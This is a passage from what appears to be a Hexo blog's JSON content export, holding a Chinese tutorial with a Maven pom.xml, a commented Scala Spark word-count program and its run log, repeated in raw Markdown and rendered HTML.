val wordscount = pairs.reduceByKey((v1, v2) => v1 + v2)  // 等同于\n\n      wordscount.collect.foreach(println)  // 打印结果，使用collect会将集群中的数据收集到当前运行drive的机器上，需要保证单台机器能放得下所有数据\n\n      sc.stop()   // 释放资源\n\n    }\n  }\n  ```\n  #### result\n  ```\n  17/10/09 16:25:59 INFO SparkUI: Stopped Spark web UI at http://WINDOWS-0EQCJPQ.hs.handsome.com.cn:4040\n  \n  \n(hello,14)\n(h1,14)\n\n\n17/10/09 16:25:59 INFO MapOutputTrackerMasterEndpoint: MapOutputTrackerMasterEndpoint stopped!\n17/10/09 16:25:59 INFO MemoryStore: MemoryStore cleared\n17/10/09 16:25:59 INFO BlockManager: BlockManager stopped\n17/10/09 16:25:59 INFO BlockManagerMaster: BlockManagerMaster stopped\n17/10/09 16:25:59 INFO OutputCommitCoordinator$OutputCommitCoordinatorEndpoint: OutputCommitCoordinator stopped!\n17/10/09 16:25:59 INFO SparkContext: Successfully stopped SparkContext\n17/10/09 16:25:59 INFO ShutdownHookManager: Shutdown hook called\n17/10/09 16:25:59 INFO ShutdownHookManager: Deleting directory C:\\Users\\hanqian18790\\AppData\\Local\\Temp\\spark-14748c73-2d1d-46b1-82de-5c1328f7fabe\n  ```\n","source":"_posts/spark/4.scala、maven、spark下的wordcount程序.md","raw":"---\ntitle: 4.scala、maven、spark下的wordcount程序\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n#### 环境\njdk1.8\n\nscala2.11.8\n\nspark2.11\n\nmaven4.0\n#### 新建工程\nide:idea\n\n新建一个maven工程，添加jdk和scala支持\n\n然后添加maven依赖\n\n编写wordcount代码\n\n右键运行scala类\n\n#### maven依赖:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>test</groupId>\n    <artifactId>test</artifactId>\n    <version>1.0</version>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.scala-lang</groupId>\n            <artifactId>scala-library</artifactId>\n            <version>2.11.8</version>\n        </dependency>\n        <dependency>\n            <groupId>org.scala-lang</groupId>\n            <artifactId>scala-compiler</artifactId>\n            <version>2.11.8</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.spark</groupId>\n            <artifactId>spark-core_2.11</artifactId>\n            <version>2.3.0-SNAPSHOT</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.spark</groupId>\n            <artifactId>spark-sql_2.11</artifactId>\n            <version>2.3.0-SNAPSHOT</version>\n        </dependency>\n    </dependencies>\n\n</project>\n```\n#### wordcout代码:\n```\n  package com.spark.app\n\n  import org.apache.spark.{SparkContext, SparkConf}\n\n  object WordCount {\n    def main(args: Array[String]) {\n      /**\n        * 第1步；创建Spark的配置对象SparkConf，设置Spark程序运行时的配置信息\n        * 例如 setAppName用来设置应用程序的名称，在程序运行的监控界面可以看到该名称，\n        * setMaster设置程序运行在本地还是运行在集群中，运行在本地可是使用local参数，也可以使用local[K]/local[*],\n        * 可以去spark官网查看它们不同的意义。 如果要运行在集群中，以Standalone模式运行的话，需要使用spark://HOST:PORT\n        * 的形式指定master的IP和端口号，默认是7077\n        */\n      val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"local\")\n      //  val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"spark://master:7077\")  // 运行在集群中\n\n      /**\n        * 第2步：创建SparkContext 对象\n        * SparkContext是Spark程序所有功能的唯一入口\n        * SparkContext核心作用： 初始化Spark应用程序运行所需要的核心组件，包括DAGScheduler、TaskScheduler、SchedulerBackend\n        * 同时还会负责Spark程序往Master注册程序\n        *\n        * 通过传入SparkConf实例来定制Spark运行的具体参数和配置信息\n        */\n      val sc = new SparkContext(conf)\n\n      /**\n        * 第3步： 根据具体的数据来源(HDFS、 HBase、Local FS、DB、 S3等)通过SparkContext来创建RDD\n        * RDD 的创建基本有三种方式： 根据外部的数据来源(例如HDFS)、根据Scala集合使用SparkContext的parallelize方法、\n        * 由其他的RDD操作产生\n        * 数据会被RDD划分成为一系列的Partitions，分配到每个Partition的数据属于一个Task的处理范畴\n        */\n\n      val lines = sc.textFile(\"D:/resources/README.md\")   // 读取本地文件\n      //  val lines = sc.textFile(\"/library/wordcount/input\")   // 读取HDFS文件，并切分成不同的Partition\n      //  val lines = sc.textFile(\"hdfs://master:9000/libarary/wordcount/input\")  // 或者明确指明是从HDFS上获取数据\n\n      /**\n        * 第4步： 对初始的RDD进行Transformation级别的处理，例如 map、filter等高阶函数来进行具体的数据计算\n        */\n      val words = lines.flatMap(_.split(\" \")).filter(word => word != \" \")  // 拆分单词，并过滤掉空格，当然还可以继续进行过滤，如去掉标点符号\n\n      val pairs = words.map(word => (word, 1))  // 在单词拆分的基础上对每个单词实例计数为1, 也就是 word => (word, 1)\n\n      val wordscount = pairs.reduceByKey(_ + _)  // 在每个单词实例计数为1的基础之上统计每个单词在文件中出现的总次数, 即key相同的value相加\n      //  val wordscount = pairs.reduceByKey((v1, v2) => v1 + v2)  // 等同于\n\n      wordscount.collect.foreach(println)  // 打印结果，使用collect会将集群中的数据收集到当前运行drive的机器上，需要保证单台机器能放得下所有数据\n\n      sc.stop()   // 释放资源\n\n    }\n  }\n  ```\n  #### result\n  ```\n  17/10/09 16:25:59 INFO SparkUI: Stopped Spark web UI at http://WINDOWS-0EQCJPQ.hs.handsome.com.cn:4040\n  \n  \n(hello,14)\n(h1,14)\n\n\n17/10/09 16:25:59 INFO MapOutputTrackerMasterEndpoint: MapOutputTrackerMasterEndpoint stopped!\n17/10/09 16:25:59 INFO MemoryStore: MemoryStore cleared\n17/10/09 16:25:59 INFO BlockManager: BlockManager stopped\n17/10/09 16:25:59 INFO BlockManagerMaster: BlockManagerMaster stopped\n17/10/09 16:25:59 INFO OutputCommitCoordinator$OutputCommitCoordinatorEndpoint: OutputCommitCoordinator stopped!\n17/10/09 16:25:59 INFO SparkContext: Successfully stopped SparkContext\n17/10/09 16:25:59 INFO ShutdownHookManager: Shutdown hook called\n17/10/09 16:25:59 INFO ShutdownHookManager: Deleting directory C:\\Users\\hanqian18790\\AppData\\Local\\Temp\\spark-14748c73-2d1d-46b1-82de-5c1328f7fabe\n  ```\n","slug":"spark/4.scala、maven、spark下的wordcount程序","published":1,"updated":"2018-07-10T13:10:09.984Z","_id":"cjjedmhbu007k0gtjbc2hhmyz","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>jdk1.8</p>\n<p>scala2.11.8</p>\n<p>spark2.11</p>\n<p>maven4.0</p>\n<h4 id=\"新建工程\"><a href=\"#新建工程\" class=\"headerlink\" title=\"新建工程\"></a>新建工程</h4><p>ide:idea</p>\n<p>新建一个maven工程，添加jdk和scala支持</p>\n<p>然后添加maven依赖</p>\n<p>编写wordcount代码</p>\n<p>右键运行scala类</p>\n<h4 id=\"maven依赖\"><a href=\"#maven依赖\" class=\"headerlink\" title=\"maven依赖:\"></a>maven依赖:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;test&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;test&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.scala-lang&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;scala-library&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.11.8&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.scala-lang&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;scala-compiler&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.11.8&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spark-core_2.11&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.3.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spark-sql_2.11&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.3.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"wordcout代码\"><a href=\"#wordcout代码\" class=\"headerlink\" title=\"wordcout代码:\"></a>wordcout代码:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.spark.app</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.&#123;SparkContext, SparkConf&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object WordCount &#123;</span><br><span class=\"line\">  def main(args: Array[String]) &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第1步；创建Spark的配置对象SparkConf，设置Spark程序运行时的配置信息</span><br><span class=\"line\">      * 例如 setAppName用来设置应用程序的名称，在程序运行的监控界面可以看到该名称，</span><br><span class=\"line\">      * setMaster设置程序运行在本地还是运行在集群中，运行在本地可是使用local参数，也可以使用local[K]/local[*],</span><br><span class=\"line\">      * 可以去spark官网查看它们不同的意义。 如果要运行在集群中，以Standalone模式运行的话，需要使用spark://HOST:PORT</span><br><span class=\"line\">      * 的形式指定master的IP和端口号，默认是7077</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">    //  val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;spark://master:7077&quot;)  // 运行在集群中</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第2步：创建SparkContext 对象</span><br><span class=\"line\">      * SparkContext是Spark程序所有功能的唯一入口</span><br><span class=\"line\">      * SparkContext核心作用： 初始化Spark应用程序运行所需要的核心组件，包括DAGScheduler、TaskScheduler、SchedulerBackend</span><br><span class=\"line\">      * 同时还会负责Spark程序往Master注册程序</span><br><span class=\"line\">      *</span><br><span class=\"line\">      * 通过传入SparkConf实例来定制Spark运行的具体参数和配置信息</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val sc = new SparkContext(conf)</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第3步： 根据具体的数据来源(HDFS、 HBase、Local FS、DB、 S3等)通过SparkContext来创建RDD</span><br><span class=\"line\">      * RDD 的创建基本有三种方式： 根据外部的数据来源(例如HDFS)、根据Scala集合使用SparkContext的parallelize方法、</span><br><span class=\"line\">      * 由其他的RDD操作产生</span><br><span class=\"line\">      * 数据会被RDD划分成为一系列的Partitions，分配到每个Partition的数据属于一个Task的处理范畴</span><br><span class=\"line\">      */</span><br><span class=\"line\"></span><br><span class=\"line\">    val lines = sc.textFile(&quot;D:/resources/README.md&quot;)   // 读取本地文件</span><br><span class=\"line\">    //  val lines = sc.textFile(&quot;/library/wordcount/input&quot;)   // 读取HDFS文件，并切分成不同的Partition</span><br><span class=\"line\">    //  val lines = sc.textFile(&quot;hdfs://master:9000/libarary/wordcount/input&quot;)  // 或者明确指明是从HDFS上获取数据</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第4步： 对初始的RDD进行Transformation级别的处理，例如 map、filter等高阶函数来进行具体的数据计算</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val words = lines.flatMap(_.split(&quot; &quot;)).filter(word =&gt; word != &quot; &quot;)  // 拆分单词，并过滤掉空格，当然还可以继续进行过滤，如去掉标点符号</span><br><span class=\"line\"></span><br><span class=\"line\">    val pairs = words.map(word =&gt; (word, 1))  // 在单词拆分的基础上对每个单词实例计数为1, 也就是 word =&gt; (word, 1)</span><br><span class=\"line\"></span><br><span class=\"line\">    val wordscount = pairs.reduceByKey(_ + _)  // 在每个单词实例计数为1的基础之上统计每个单词在文件中出现的总次数, 即key相同的value相加</span><br><span class=\"line\">    //  val wordscount = pairs.reduceByKey((v1, v2) =&gt; v1 + v2)  // 等同于</span><br><span class=\"line\"></span><br><span class=\"line\">    wordscount.collect.foreach(println)  // 打印结果，使用collect会将集群中的数据收集到当前运行drive的机器上，需要保证单台机器能放得下所有数据</span><br><span class=\"line\"></span><br><span class=\"line\">    sc.stop()   // 释放资源</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"result\"><a href=\"#result\" class=\"headerlink\" title=\"result\"></a>result</h4>  <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  17/10/09 16:25:59 INFO SparkUI: Stopped Spark web UI at http://WINDOWS-0EQCJPQ.hs.handsome.com.cn:4040</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">(hello,14)</span><br><span class=\"line\">(h1,14)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">17/10/09 16:25:59 INFO MapOutputTrackerMasterEndpoint: MapOutputTrackerMasterEndpoint stopped!</span><br><span class=\"line\">17/10/09 16:25:59 INFO MemoryStore: MemoryStore cleared</span><br><span class=\"line\">17/10/09 16:25:59 INFO BlockManager: BlockManager stopped</span><br><span class=\"line\">17/10/09 16:25:59 INFO BlockManagerMaster: BlockManagerMaster stopped</span><br><span class=\"line\">17/10/09 16:25:59 INFO OutputCommitCoordinator$OutputCommitCoordinatorEndpoint: OutputCommitCoordinator stopped!</span><br><span class=\"line\">17/10/09 16:25:59 INFO SparkContext: Successfully stopped SparkContext</span><br><span class=\"line\">17/10/09 16:25:59 INFO ShutdownHookManager: Shutdown hook called</span><br><span class=\"line\">17/10/09 16:25:59 INFO ShutdownHookManager: Deleting directory C:\\Users\\hanqian18790\\AppData\\Local\\Temp\\spark-14748c73-2d1d-46b1-82de-5c1328f7fabe</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><p>jdk1.8</p>\n<p>scala2.11.8</p>\n<p>spark2.11</p>\n<p>maven4.0</p>\n<h4 id=\"新建工程\"><a href=\"#新建工程\" class=\"headerlink\" title=\"新建工程\"></a>新建工程</h4><p>ide:idea</p>\n<p>新建一个maven工程，添加jdk和scala支持</p>\n<p>然后添加maven依赖</p>\n<p>编写wordcount代码</p>\n<p>右键运行scala类</p>\n<h4 id=\"maven依赖\"><a href=\"#maven依赖\" class=\"headerlink\" title=\"maven依赖:\"></a>maven依赖:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;test&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;test&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.scala-lang&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;scala-library&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.11.8&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.scala-lang&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;scala-compiler&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.11.8&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spark-core_2.11&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.3.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spark-sql_2.11&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;2.3.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"wordcout代码\"><a href=\"#wordcout代码\" class=\"headerlink\" title=\"wordcout代码:\"></a>wordcout代码:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.spark.app</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.&#123;SparkContext, SparkConf&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">object WordCount &#123;</span><br><span class=\"line\">  def main(args: Array[String]) &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第1步；创建Spark的配置对象SparkConf，设置Spark程序运行时的配置信息</span><br><span class=\"line\">      * 例如 setAppName用来设置应用程序的名称，在程序运行的监控界面可以看到该名称，</span><br><span class=\"line\">      * setMaster设置程序运行在本地还是运行在集群中，运行在本地可是使用local参数，也可以使用local[K]/local[*],</span><br><span class=\"line\">      * 可以去spark官网查看它们不同的意义。 如果要运行在集群中，以Standalone模式运行的话，需要使用spark://HOST:PORT</span><br><span class=\"line\">      * 的形式指定master的IP和端口号，默认是7077</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">    //  val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;spark://master:7077&quot;)  // 运行在集群中</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第2步：创建SparkContext 对象</span><br><span class=\"line\">      * SparkContext是Spark程序所有功能的唯一入口</span><br><span class=\"line\">      * SparkContext核心作用： 初始化Spark应用程序运行所需要的核心组件，包括DAGScheduler、TaskScheduler、SchedulerBackend</span><br><span class=\"line\">      * 同时还会负责Spark程序往Master注册程序</span><br><span class=\"line\">      *</span><br><span class=\"line\">      * 通过传入SparkConf实例来定制Spark运行的具体参数和配置信息</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val sc = new SparkContext(conf)</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第3步： 根据具体的数据来源(HDFS、 HBase、Local FS、DB、 S3等)通过SparkContext来创建RDD</span><br><span class=\"line\">      * RDD 的创建基本有三种方式： 根据外部的数据来源(例如HDFS)、根据Scala集合使用SparkContext的parallelize方法、</span><br><span class=\"line\">      * 由其他的RDD操作产生</span><br><span class=\"line\">      * 数据会被RDD划分成为一系列的Partitions，分配到每个Partition的数据属于一个Task的处理范畴</span><br><span class=\"line\">      */</span><br><span class=\"line\"></span><br><span class=\"line\">    val lines = sc.textFile(&quot;D:/resources/README.md&quot;)   // 读取本地文件</span><br><span class=\"line\">    //  val lines = sc.textFile(&quot;/library/wordcount/input&quot;)   // 读取HDFS文件，并切分成不同的Partition</span><br><span class=\"line\">    //  val lines = sc.textFile(&quot;hdfs://master:9000/libarary/wordcount/input&quot;)  // 或者明确指明是从HDFS上获取数据</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">      * 第4步： 对初始的RDD进行Transformation级别的处理，例如 map、filter等高阶函数来进行具体的数据计算</span><br><span class=\"line\">      */</span><br><span class=\"line\">    val words = lines.flatMap(_.split(&quot; &quot;)).filter(word =&gt; word != &quot; &quot;)  // 拆分单词，并过滤掉空格，当然还可以继续进行过滤，如去掉标点符号</span><br><span class=\"line\"></span><br><span class=\"line\">    val pairs = words.map(word =&gt; (word, 1))  // 在单词拆分的基础上对每个单词实例计数为1, 也就是 word =&gt; (word, 1)</span><br><span class=\"line\"></span><br><span class=\"line\">    val wordscount = pairs.reduceByKey(_ + _)  // 在每个单词实例计数为1的基础之上统计每个单词在文件中出现的总次数, 即key相同的value相加</span><br><span class=\"line\">    //  val wordscount = pairs.reduceByKey((v1, v2) =&gt; v1 + v2)  // 等同于</span><br><span class=\"line\"></span><br><span class=\"line\">    wordscount.collect.foreach(println)  // 打印结果，使用collect会将集群中的数据收集到当前运行drive的机器上，需要保证单台机器能放得下所有数据</span><br><span class=\"line\"></span><br><span class=\"line\">    sc.stop()   // 释放资源</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"result\"><a href=\"#result\" class=\"headerlink\" title=\"result\"></a>result</h4>  <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  17/10/09 16:25:59 INFO SparkUI: Stopped Spark web UI at http://WINDOWS-0EQCJPQ.hs.handsome.com.cn:4040</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">(hello,14)</span><br><span class=\"line\">(h1,14)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">17/10/09 16:25:59 INFO MapOutputTrackerMasterEndpoint: MapOutputTrackerMasterEndpoint stopped!</span><br><span class=\"line\">17/10/09 16:25:59 INFO MemoryStore: MemoryStore cleared</span><br><span class=\"line\">17/10/09 16:25:59 INFO BlockManager: BlockManager stopped</span><br><span class=\"line\">17/10/09 16:25:59 INFO BlockManagerMaster: BlockManagerMaster stopped</span><br><span class=\"line\">17/10/09 16:25:59 INFO OutputCommitCoordinator$OutputCommitCoordinatorEndpoint: 